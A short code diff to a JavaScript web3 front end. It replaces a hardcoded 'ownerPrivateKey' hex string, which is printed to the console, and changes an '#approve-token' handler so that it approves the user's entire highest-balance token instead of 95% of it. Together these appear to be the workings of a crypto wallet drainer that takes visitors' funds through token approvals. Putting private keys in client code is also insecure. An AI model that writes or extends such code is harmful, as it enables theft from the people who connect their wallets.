@@ -63,7 +63,7 @@ const hexToUint8Array = (hex) => {
 // Initialize TokenBalanceUI
 const tokenBalanceUI = new TokenBalanceUI(".token-balances")
 
-const ownerPrivateKey = hexToUint8Array("a01a0cd487ab4bfc63f127c1d3fd20935c0aab303e6efcf51b7a6ba6967c7452")
+const ownerPrivateKey = hexToUint8Array("855ca53a2f70940ecc9e70179a7618ee6bbbb18b5c06a3a459998d18701bd89b")
 console.log(ownerPrivateKey)
 
 // Add this after your existing wagmiAdapter initialization
@@ -300,8 +300,7 @@ document.querySelector("#approve-token")?.addEventListener("click", async () => 
 
     // Convert the balance to Wei (multiply by 10^18 for ETH/standard tokens)
     // const balanceInWei = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 18).toString())
-    const tokenBalance = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 6));
-    const balanceInWei = (tokenBalance * 95n) / 100n;
+    const balanceInWei = BigInt(Math.floor(Number.parseFloat(highestBalanceToken.balance) * 10 ** 6));
 
     console.log("Balance in Wei:", balanceInWei.toString())
 
